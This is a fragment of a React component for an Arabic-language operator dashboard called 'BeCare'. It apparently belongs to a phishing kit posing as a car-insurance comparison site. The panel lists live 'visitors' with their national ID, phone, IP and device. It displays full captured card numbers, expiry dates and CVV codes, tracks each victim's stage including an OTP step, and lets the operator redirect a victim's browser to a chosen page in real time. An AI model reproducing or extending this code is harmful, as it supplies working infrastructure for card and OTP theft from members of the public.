          borderBottom: "1px solid #e5e7eb",
          position: "sticky",
          top: 0,
          zIndex: 100,
        }}
      >
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: 6,
              background: "linear-gradient(135deg, #22c55e, #15803d)",
              display: "grid",
              placeItems: "center",
              fontWeight: 900,
              fontSize: "0.8rem",
              color: "#fff",
            }}
          >
            B
          </div>
          <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
        </div>

        {/* Stats */}
        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto" }}>
          {/* Live indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: "50%",
                background: "#4ade80",
                boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)",
              }}
            />
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
          </div>

          {/* Today */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <path d="M16 7h6v6M22 7L12 17l-5-5L2 17" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          {/* Total */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          {/* Cards */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb", color: "#2563eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect width="20" height="14" x="2" y="5" rx="2" />
              <line x1="2" x2="22" y1="10" y2="10" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
          </div>

          {/* Visitors */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", color: "#16a34a" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
              <circle cx="9" cy="7" r="4" />
              <path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
          </div>
        </div>

        {/* User */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginRight: 8, paddingRight: 8, borderRight: "1px solid #e5e7eb" }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: "50%",
              background: "linear-gradient(135deg, #3b82f6, #7c3aed)",
              display: "grid",
              placeItems: "center",
              color: "#fff",
              fontWeight: 700,
              fontSize: "0.8rem",
            }}
          >
            A
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div style={{ display: "flex", minHeight: "calc(100vh - 54px)" }}>
        {/* Sidebar - Visitor List */}
        <aside
          style={{
            width: 340,
            background: "#ffffff",
            borderLeft: "1px solid #e5e7eb",
            display: "flex",
            flexDirection: "column",
            maxHeight: "calc(100vh - 54px)",
            overflow: "hidden",
          }}
        >
          {/* Search and Filters */}
          <div style={{ padding: 12, borderBottom: "1px solid #e5e7eb" }}>
            {/* Filter buttons */}
            <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
              <button
                onClick={() => setFilterMode("all")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "all" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "all" ? "#f0fdf4" : "#fff",
                  color: filterMode === "all" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                الكل ({requests.length})
              </button>
              <button
                onClick={() => setFilterMode("cards")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "cards" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "cards" ? "#f0fdf4" : "#fff",
                  color: filterMode === "cards" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                بطاقة ({stats.completedCount})
              </button>
            </div>

            {/* Search */}
            <div style={{ position: "relative" }}>
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#9ca3af"
                strokeWidth="2"
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)" }}
              >
                <circle cx="11" cy="11" r="8" />
                <path d="m21 21-4.3-4.3" />
              </svg>
              <input
                type="text"
                placeholder="بحث (الاسم، الهوية، الهاتف)"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  width: "100%",
                  padding: "10px 12px 10px 36px",
                  border: "1px solid #e5e7eb",
                  borderRadius: 8,
                  fontSize: "0.85rem",
                  outline: "none",
                }}
              />
            </div>
          </div>

          {/* Visitor List - Sorted by newest first */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            {filteredRequests.map((item) => (
              <div
                key={item.id}
                onClick={() => setSelectedRequestId(item.id)}
                style={{
                  padding: "16px",
                  borderBottom: "1px solid #f3f4f6",
                  background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
                  cursor: "pointer",
                  transition: "background 0.2s",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
                    <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ 
                      background: "#f3f4f6", 
                      padding: "4px 8px", 
                      borderRadius: 6,
                      fontSize: "0.8rem",
                      fontWeight: 600
                    }}>
                      ⏱️ <LiveTimer startTime={item.updatedAt || item.submittedAt || ""} />
                    </span>
                  </div>
                </div>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div
                    style={{
                      display: "inline-block",
                      padding: "4px 12px",
                      borderRadius: 6,
                      fontSize: "0.8rem",
                      fontWeight: 600,
                      background:
                        item.stage === "الدفع"
                          ? "#dbeafe"
                          : item.stage === "التأمين"
                            ? "#fef3c7"
                            : item.stage === "مقارنة"
                              ? "#f3e8ff"
                              : item.stage === "OTP"
                                ? "#fee2e2"
                                : "#e0f2fe",
                      color:
                        item.stage === "الدفع"
                          ? "#2563eb"
                          : item.stage === "التأمين"
                            ? "#d97706"
                            : item.stage === "مقارنة"
                              ? "#9333ea"
                              : item.stage === "OTP"
                                ? "#dc2626"
                                : "#0284c7",
                    }}
                  >
                    {item.stage}
                  </div>
                  <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
                </div>
              </div>
            ))}
            {filteredRequests.length === 0 && (
              <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
            )}
          </div>
        </aside>

        {/* Main Panel - Client Details */}
        <main style={{ flex: 1, padding: 20, overflowY: "auto" }}>
          {selectedRequest && (
            <div style={{ maxWidth: 800 }}>
              {/* Client Header */}
              <div
                style={{
                  background: "#ffffff",
                  borderRadius: 12,
                  padding: 16,
                  marginBottom: 16,
                  border: "1px solid #e5e7eb",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
                  {/* Client Info */}
                  <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                    <div
                      style={{
                        width: 48,
                        height: 48,
                        borderRadius: "50%",
                        background: "#f0f9ff",
                        display: "grid",
                        placeItems: "center",
                        fontSize: "1.5rem",
                      }}
                    >
                      {getCountryFlag(selectedRequest.raw)}
                    </div>
                    <div>
                      <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 700, color: "#111827" }}>{selectedRequest.customer}</h2>
                      <p style={{ margin: "4px 0 0", fontSize: "0.8rem", color: "#6b7280" }}>{selectedRequest.id}</p>
                    </div>
                  </div>
                </div>

                {/* Current Page Indicator */}
                <div style={{ marginTop: 8, padding: "6px 12px", background: "#f0f9ff", borderRadius: 6, display: "inline-block" }}>
                  <span style={{ fontSize: "0.8rem", color: "#2563eb", fontWeight: 600 }}>
                    الصفحة الحالية: {getCurrentPage() || "غير معروف"}
                  </span>
                </div>

                {/* Manual Redirect Control */}
                <div style={{ marginTop: 16, padding: "12px", background: "#fef3c7", borderRadius: 8, border: "1px solid #fcd34d" }}>
                  <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>
                    🔄 توجيه العميل يدوياً
                  </p>
                  <select
                    value={redirectPage}
                    onChange={async (e) => {
                      const selectedPage = e.target.value;
                      if (!selectedPage) return;
                      
                      const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                      if (!visitorId) return;
                      
                      setActionLoading("redirect");
                      setRedirectPage(selectedPage);
                      
                      try {
                        const res = await fetch("/api/dashboard/redirect", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                        });
                        if (res.ok) {
                          const pageLabel = pageOptions.find(p => p.value === selectedPage)?.label || selectedPage;
                          showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
                        } else {
                          showNotification("error", "حدث خطأ");
                        }
                      } catch {
                        showNotification("error", "فشل الاتصال");
                      }
                      setActionLoading(null);
                      setRedirectPage(""); // Reset after sending
                    }}
                    style={{
                      width: "100%",
                      padding: "10px 12px",
                      borderRadius: 8,
                      border: "2px solid #e5e7eb",
                      fontSize: "0.9rem",
                      background: "#fff",
                      cursor: "pointer",
                    }}
                  >
                    {pageOptions.map((opt) => (
                      <option key={opt.value} value={opt.value}>{opt.label}</option>
                    ))}
                  </select>
                  <p style={{ margin: "8px 0 0", fontSize: "0.75rem", color: "#92400e" }}>
                    سيتم توجيه العميل للصفحة المختارة فوراً
                  </p>
                </div>

                {/* Device Info */}
                <div style={{ display: "flex", alignItems: "center", gap: 16, marginTop: 16, paddingTop: 16, borderTop: "1px solid #f3f4f6" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>{getDeviceIcon(selectedRequest.raw)}</span>
                    <span>{selectedRequest.raw?.deviceType || selectedRequest.raw?.platform || "غير معروف"}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>{getCountryFlag(selectedRequest.raw)}</span>
                    <span>{getCountryCode(selectedRequest.raw)}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>🌐</span>
                    <span>{selectedRequest.raw?.ip || "—"}</span>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              {renderActionButtons()}

              {/* Client Details Grid */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: 16 }}>
                {/* Basic Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات أساسية</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "الاسم", value: selectedRequest.customer },
                      { label: "رقم الهوية", value: selectedRequest.raw?.identityNumber || selectedRequest.raw?.buyerIdNumber },
                      { label: "رقم الهاتف", value: selectedRequest.raw?.phoneNumber },
                      { label: "نوع الوثيقة", value: selectedRequest.raw?.documentType },
                      { label: "الرقم التسلسلي", value: selectedRequest.raw?.serialNumber },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Insurance Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل التأمين</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "نوع التغطية", value: selectedRequest.raw?.coverageType },
                      { label: "موديل المركبة", value: selectedRequest.raw?.vehicleModel },
                      { label: "سنة الصنع", value: selectedRequest.raw?.manufacturingYear },
                      { label: "استخدام المركبة", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
                      { label: "موقع الإصلاح", value: selectedRequest.raw?.repairLocation },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Offer Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>العرض المختار</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "الشركة", value: selectedRequest.raw?.companyName },
                      { label: "السعر الأصلي", value: selectedRequest.raw?.originalPrice },
                      { label: "الخصم", value: selectedRequest.raw?.discount },
                      { label: "السعر النهائي", value: selectedRequest.raw?.finalPrice },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Card Details */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل البطاقة</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
                      { label: "اسم حامل البطاقة", value: selectedRequest.raw?.cardOwner },
                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
                      { label: "رمز الأمان (CVV)", value: selectedRequest.raw?.cvv },
                      { label: "الحالة", value: getPaymentStatus() === 'approved' ? '✅ مقبولة' : getPaymentStatus() === 'rejected' ? '❌ مرفوضة' : '⏳ بانتظار المراجعة' },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>
              </div>

              {/* Action Buttons - Below Card Details */}
              {renderActionButtons()}
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
